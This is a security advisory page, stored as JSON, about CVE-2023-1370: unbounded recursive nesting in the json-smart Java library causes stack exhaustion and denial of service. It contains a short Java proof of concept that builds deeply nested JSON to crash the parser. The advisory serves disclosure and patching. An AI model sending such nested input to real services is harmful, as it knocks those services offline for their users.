{"hash":"dca2157440c8482e89a464cf3a796e8484710c4f","data":{"post":{"title":"json-smart Stack exhaustion DoS","path":"/vulnerabilities/stack-exhaustion-in-json-smart-leads-to-denial-of-service-when-parsing-malformed-json-xray-427633/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Stack exhaustion in json-smart leads to denial of service when parsing malformed JSON</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>net.minidev:json-smart</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,2.4.9)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p><a href=\"https://netplex.github.io/json-smart/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Json-smart</a> is a performance focused, JSON processor lib.\nWhen reaching a <code>[</code> or <code>{</code> character in the JSON input, the code parses an array or an object respectively.\nIt was discovered that the code does not have any limit to the nesting of such arrays or objects. Since the parsing of nested arrays and objects is done recursively, nesting too many of them can cause a stack exhaustion (stack overflow) and crash the software.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>The following code will raise a <code>StackOverflowError</code>:</p>\n<pre><code class=\"language-java\">StringBuilder s = new StringBuilder();\nfor (int i = 0; i &#x3C; 10000 ; i++) {\n  s.append(\"{\\\"a\\\":\");\n}\ns.append(\"1\");\nfor (int i = 0; i &#x3C; 10000 ; i++) {\n  s.append(\"}\");\n}\nJSONParser p = new JSONParser(JSONParser.MODE_JSON_SIMPLE);\np.parse(s.toString());\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/netplex/json-smart-v2/commit/5b3205d051952d3100aa0db1535f6ba6226bd87a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix commit</a></p>\n","description":"CVE-2023-1370 High severity. Stack exhaustion in json-smart leads to denial of service when parsing malformed JSON","date_published":"2023-03-13","xray_id":"XRAY-427633","vul_id":"CVE-2023-1370","severity":"high","discovered_by":"Ori Hollander","last_updated":"2023-03-13","cvss":7.5}},"context":{}}